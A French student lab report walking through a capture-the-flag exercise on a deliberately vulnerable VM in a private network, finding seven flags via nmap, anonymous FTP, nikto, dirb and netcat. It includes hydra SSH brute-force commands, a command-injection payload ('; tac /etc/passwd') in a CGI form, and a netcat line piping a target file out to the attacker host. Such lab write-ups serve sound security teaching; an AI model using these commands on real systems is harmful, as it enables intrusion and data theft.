# Rapport du TP1

#### _(Si les addresses ip peuvent varier dans les commandes et les captures d'écran entre 10.0.2.15 et 10.0.2.5, c'est parce que j'ai réalisé le tp sur 2 jours différents et en redémarrant la vm, l'ip n'était plus la même)_

Pour scanner toutes les machines sur le réseau
`sudo netdiscover -r 10.0.2.0/24`
![1731071846729](image/rapport/1731071846729.png)
Ca nous ermet de trouver l'ip de la machine cible : 10.0.2.15

on test la connection entre les 2 machines
`ping 10.0.2.15`
![1731070918309](image/rapport/1731070918309.png)

on commence par chercher tous les ports ouverts
`nmap -p- 10.0.2.15`
![1731070574383](image/rapport/1731070574383.png)

## Port 21

On peut analyser plus en détail le port 21
`nmap -sC -sV -A -p 21 10.0.2.15`
![1731075008382](image/rapport/1731075008382.png)
on voit ici qu'il y a un FLAG.txt

on peut se connecter en mode ftp (avec l'identifiant et le mdp 'ftp')
`ftp 10.0.2.15`
et en faisant "ls" on retrouve bien notre FLAG.txt
![1731595575888](image/rapport-tp1/1731595575888.png)

on peut mintenant rapatrier sur la machine hote le fichier
`get FLAG.txt`
![1731074484434](image/rapport/1731074484434.png)

puis sur la machine hote, on peut lire le fichier, on a trouvé un **FLAG_1** :
`cat FLAG.txt`
![1731074552067](image/rapport/1731074552067.png)

## Port 22

On peut analyser plus en détail le port 22
`nmap -sC -sV -A -p 22 10.0.2.15`
![1731075194425](image/rapport/1731075194425.png)

On voit qu'il y a du ssh, donc on va faire une attaque brut force en utilisant hydra
`sudo hydra -l root -p /usr/share/wordlists/metasploit/unix-users.txt -t 6 ssh://10.0.2.15`
![1731075451542](image/rapport/1731075451542.png)
On constate que ça échoue.

## Port 80

`nmap -sC -sV -A -p 80 10.0.2.15`
![1731075665644](image/rapport/1731075665644.png)
On voit que c'est du http et que le port 80 correspond au port par défaut du serveur web.

Il s'agit d'un serveur web, on peut se rendre à l'url `10.0.2.15`
On tombe sur une page web avec rien de spécial dessus.
![1731598519413](image/rapport-tp1/1731598519413.png)
En inspectant le code source de la page je ne vois rien non plus.

On utilise donc l'outil nikto (port 80 par défaut donc pas besoin d'options)
`nikto -h 10.0.2.15`
![1731075895889](image/rapport/1731075895889.png)
Avec dirb on peut voir les sous dossiers cachés (port 80 par défaut donc pas besoin d'options)
`dirb http://10.0.2.15 /usr/share/wordlists/dirb/common.txt`
![1731076851337](image/rapport/1731076851337.png)

On voit qu'il y a un dossier `/passwords`
Je me rend dans le navigateurs et j'essaie d'accéder à `http://10.0.2.15/passwords` et je trouve un **FLAG_2**
![1731076257587](image/rapport/1731076257587.png)
![1731076374431](image/rapport/1731076374431.png)

A la meme racine il y a aussi un fichier passwords.html donc je m'y rend `http://10.0.2.15/passwords.html`
![1731077959191](image/rapport/1731077959191.png)
En inspectant la page, on trouve un mot de passe qui pourrait servir pour la suite : "winter"

En effectuant la commande `dirb http://10.0.2.15 /usr/share/wordlists/dirb/common.txt`
![1731076851337](image/rapport/1731076851337.png)
On observe aussi un fichier `/robots.txt`

`curl 10.0.2.15/robots.txt`
![1731077800614](image/rapport/1731077800614.png)

On se rend à l'Url `10.0.2.15/cgi-bin/root_shell.cgi`
![1731078285579](image/rapport/1731078285579.png)
Il n'y a pas grand chose à voir ici

On esssaye l'Url `10.0.2.15/cgi-bin/tracertool.cgi`
![1731078349122](image/rapport/1731078349122.png)
On tombe sur un outil qui demande d'entrer une Ip

On remarque que l'on peut taper des commandes dans la zone de texte en ajoutant ";" avant
On essaye d'accéder au fichier contenant les information des utilisateurs du système.
`; cat /etc/passwd`

L'interface nous affiche un chat retourné. Avec un peu de réflexion on comprend que c'est le "cat" qui est à l'envers, donc "tac"
`; tac /etc/passwd`
![1731598950870](image/rapport-tp1/1731598950870.png)

L'interface affiche e nombreuses information, et on remarque le mot clé "Summer" sur la 2e ligne, contraire de "winter" que l'on a repéré avant, ainsi que "Morty" et "RickSanchez", qui font référence à la page web de l'adresse `10.0.2.15`.

On peut se connecter à l'utilisateur Summer en ssh, et avec le mot de passe "winter".
`ssh Summer@10.0.2.5 -p 22222`
![1731599330907](image/rapport-tp1/1731599330907.png)

En tapant la commande `cat FLAG.txt`, on retrouve la meme image de chat à l'envers. `tac FLAG.txt` nous permet de voir le vrai **FLAG_3**.
![1731599482546](image/rapport-tp1/1731599482546.png)

En continuant à chercher, je me déplace à la racine du dossier, où il y a 3 utilisateurs (Morty, RickSanchez, Summer)
On peut utiliser la commande find pour avoir une idée de l'arboressance des fichiers.
![1731602059562](image/rapport-tp1/1731602059562.png)

On trouve un fichier NotAFlage.txt suspect. En l'ouvrant on s'aperçoit que ce n'est vraiment pas un Flag.

On peut aussi voir un fichier image nommé "Safe_Password.jpg". Comme on est connecté en ssh il est compliqué de réaliser des interractions dessus. En cherchant un peu j'ai vu qu'il était possible d'ouvrir une connexion entre la machine hote et la cible avec netcat afin de rapatrier le fichier sur la machine hote.

En tapant la commande suivante sur ma machine hote, j'ouvre un connexion réseau et je dis que je vais appeller le fichier que je vais recevoir "fileMDP.jpg" : `nc -l -p 12345 > fileMDP.jpg`

Depuis ma machine cible, j'envoie le fichier sur l'hote sur le port 12345 `cat Morty/Safe_Password.jpg | nc 10.0.2.4 12345`

![1731601298908](image/rapport-tp1/1731601298908.png)
L'hote a bien récupérer le fichier.

On utilise la commande `strings fileMDP.jpg` pour déchiffrer toutes les chaines de caractère lisible dans le fichier binaire de l'image. Cette commande renvoie plein de lignes de caractère, dont une qui retient mon attention :
![1731601476011](image/rapport-tp1/1731601476011.png)

Sur la machine cible en ssh, je peux unzip l'archive /home/Morty/journal.txt.zip à l'aide du mot de passe que j'ai obtenu.
J'ai une erreur "permission denied" car je n'ai pas les droits d'unzip l'archive ici. Je vais donc la copier dans le répertoire tmp.
`cp /Morty/journal.txt.zip /tmp/`
puis dans /tmp je l'unzip
`unzip journal.txt.zip`

en lisant le fichier je trouve un **FLAG_4**
![1731601949819](image/rapport-tp1/1731601949819.png)

## Port 9090

`nmap -sC -sV -A -p 9090 10.0.2.15`
![1731076487206](image/rapport/1731076487206.png)

On voit que c'est encore un serveur web, donc on va utiliser à nouveau nikto et dirb

Je ne trouve rien de spécial avec les commandes. Il s'agit d'un serveur web donc j'essaie de simplement tapper l'url `http://10.0.2.15:9090`
![1731078655553](image/rapport/1731078655553.png)
On tombe sur une page web contenant un **FLAG_5**

## Port 13337

`nmap -sC -sV -A -p 13337 10.0.2.15`
![1731079070435](image/rapport/1731079070435.png)

On a pas d'info (ssh, ftp, web) donc on peut utiliser netcat pour établir une connexion réseau et essayer de trouver des indices.
`nc 10.0.2.15 13337`

![1731078939699](image/rapport/1731078939699.png)
On a trouvé un **FLAG_6**

## Port 22222

`nmap -sC -sV -A -p 22222 10.0.2.15`
![1731079545295](image/rapport/1731079545295.png)
On constate que c'est du ssh donc on va faire une attaque brut force en utilisant hydra

`sudo hydra -l root -p /usr/share/wordlists/metasploit/unix-users.txt -t 6 ssh://10.0.2.15`
![1731602532478](image/rapport-tp1/1731602532478.png)
Malheureusement je n'ai rien trouvé avec cette attaque brut force.

## Port 60000

`nmap -sC -sV -A -p 60000 10.0.2.5`
![1731596005710](image/rapport-tp1/1731596005710.png)
On a pas vraiment d'informations donc on va utiliser netcat pour établir une connexion.

`nc 10.0.2.5 60000`
![1731597495624](image/rapport-tp1/1731597495624.png)
On trouve bien un fichier **FLAG_7**
